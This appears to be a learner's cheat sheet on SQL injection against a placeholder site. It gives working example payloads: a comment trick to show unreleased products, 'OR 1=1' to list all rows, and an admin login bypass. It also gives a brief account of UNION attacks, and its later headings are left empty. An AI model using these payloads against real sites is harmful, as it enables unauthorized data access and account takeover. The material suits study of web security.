# Retrieving hidden data
### you can modify an SQL query to return additional results.



1. Example

attacked url: https://insecure-website.com/products?category=Gifts

corresponding SQL:
```sql
SELECT * FROM products WHERE category = 'Gifts' AND released = 1
```
For unreleased products, presumably released = 0:

SQL injection: https://insecure-website.com/products?category=Gifts'--

corresponding SQL:
```sql
SELECT * FROM products WHERE category = 'Gifts'--' AND released = 1
```

2. Example

attacked url: https://insecure-website.com/products?category=Gifts

corresponding SQL:
```sql
SELECT * FROM products WHERE category = 'Gifts' AND released = 1
```

Display all category (also not listed on website)

SQL injection: https://insecure-website.com/products?category=Gifts'+OR+1=1--

corresponding SQL:
```sql
SELECT * FROM products WHERE category = 'Gifts' OR 1=1--' AND released = 1
```

# Subverting application logic
### you can change a query to interfere with the application's logic.

3. Example
When you done a login on a website, the application makes this SQL query to databse to verify is a user with following credentials exists:

attacked url: https://insecure-website.com/login?username=wiener&password=bluecheese

corresponding SQL:
```sql
SELECT * FROM users WHERE username = 'wiener' AND password = 'bluecheese'
```

Authenticate as another user (i.e admin):

attacked url: https://insecure-website.com/login?username=admin'--&password=notimportant

corresponding SQL:
```sql
SELECT * FROM users WHERE username = 'admin'--' AND password = 'notimportant'
```

# UNION attacks
### you can retrieve data from different database tables.

In cases where the results of an SQL query are returned within the application's responses, an attacker can leverage an SQL injection vulnerability to retrieve data from other tables within the database.
This is done using the UNION keyword, which lets you execute an additional SELECT query and append the results to the original query. 

The UNION keyword lets you execute one or more additional SELECT queries and append the results to the original query. For example:
SELECT a, b FROM table1 UNION SELECT c, d FROM table2

:warning: 
For a UNION query to work, two key requirements must be met:
1. The individual queries must return the same number of columns.
2. The data types in each column must be compatible between the individual queries.

# Examining the database
### you can extract information about the version and structure of the database.

---
# Blind SQL injection
### the results of a query you control are not returned in the application's responses.
